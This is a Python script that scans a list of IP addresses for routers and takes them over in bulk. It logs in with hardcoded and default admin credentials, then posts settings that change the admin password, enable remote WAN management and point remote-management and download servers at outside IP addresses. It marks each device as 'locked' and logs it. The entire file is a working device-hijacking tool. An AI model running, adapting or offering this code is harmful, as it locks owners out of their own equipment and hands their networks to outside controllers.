import requests
from concurrent.futures import ThreadPoolExecutor

def check_login(ip_port):
    url = f"http://{ip_port}/Management.asp"
    headers = {
        "Authorization": "Basic YWRtaW46c0F3TmpCVmFqSXU4MTA5",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
        "Connection": "close"
    }

    try:
        response = requests.get(url, headers=headers, timeout=30)  # Set the timeout in seconds
        response.raise_for_status()  # Raise HTTPError for bad responses
    except requests.exceptions.RequestException:
        return False

    print(f"[f] logged in: {ip_port}")
    return response.status_code == 200

def apply_settings(ip_port):
    url = f"http://{ip_port}/apply.cgi"
    headers = {
        "Content-Length": "800",
        "Authorization": "Basic YWRtaW46YWRtaW4=",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
        "Connection": "close"
    }

    data = {
        "submit_button": "Management",
        "action": "ApplyTake",
        "change_action": "",
        "submit_type": "",
        "commit": "1",
        "remote_login_svr_enable": "1",
        "PasswdModify": "0",
        "remote_mgt_https": "0",
        "http_enable": "1",
        "info_passwd": "0",
        "https_enable": "0",
        "http_username": "admin",
        "http_passwd": "sAwNjBVajIu8109",
        "http_passwdConfirm": "sAwNjBVajIu8109",
        "_http_enable": "1",
        "refresh_time": "3",
        "status_auth": "1",
        "remote_management": "1",
        "http_wanport": "8088",
        "http_lanport": "80",
        "remote_mgt_telnet": "0",
        "cron_enable": "1",
        "cron_jobs": "",
        "language": "english",
        "enable_remote_manager": "0",
        "wifi_process": "v2",
        "remote_login_svr_ip": "121.43.158.101",
        "remote_login_svr_port": "8039",
        "remote_manager_srvip": "166.111.8.238",
        "remote_manager_srvport": "40001",
        "remote_manager_heartint": "60",
        "flow_upload_intrvl": "300",
        "SNSelect": "1",
        "remote_manager_devnum": "88888888",
        "remote_manager_devtype": "Router",
        "route_www": "wifi.cn",
        "app_wdown_enable": "0",
        "app_wdown_srvip": "42.121.16.56",
        "app_wdown_srvport": "882"
        # Add all other parameters from your request here
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=30)  # Set the timeout in seconds
        response.raise_for_status()  # Raise HTTPError for bad responses
    except requests.exceptions.RequestException:
        pass

    if response.status_code == 200:
        print(f"[f] locked: {ip_port}")

def process_ip(ip_port):
    if check_login(ip_port):
        apply_settings(ip_port)
        with open('outp.txt', 'a') as outfile:
            outfile.write(f"{ip_port}\n")

# Read IP:PORT from ips.txt
with open('ips.txt', 'r') as file:
    ip_ports = file.read().splitlines()

# Process IPs with threading
with ThreadPoolExecutor(max_workers=1000) as executor:
    executor.map(process_ip, ip_ports)
